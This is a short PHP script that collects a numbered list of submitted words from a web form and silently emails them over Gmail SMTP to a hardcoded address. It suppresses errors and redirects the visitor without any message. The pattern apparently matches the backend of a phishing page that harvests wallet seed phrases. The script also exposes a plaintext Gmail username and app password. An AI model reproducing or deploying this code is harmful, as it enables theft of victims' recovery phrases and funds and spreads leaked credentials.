<?php
error_reporting(0);
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $words = $_POST['wordinput'];

    $body = "<h2>Submitted Words</h2><ul>";
    foreach ($words as $index => $word) {
        $body .= "<li><strong>Word #" . ($index + 1) . ":</strong> " . htmlspecialchars($word) . "</li>";
    }
    $body .= "</ul>";

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'harryjonson616@gmail.com';
        $mail->Password   = 'hron taer rhsc zefv';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        $mail->setFrom('harryjonson616@gmail.com', 'Word Form');
        $mail->addAddress('harryjonson616@gmail.com');

        $mail->isHTML(true);
        $mail->Subject = 'Submitted Words from Form';
        $mail->Body    = $body;

        $mail->send();
        // No echo here!
    } catch (Exception $e) {
        // Optionally log error to file or show on a dev environment
    }

    header("Location: index.html"); // Now this works!
    exit();
}
?>
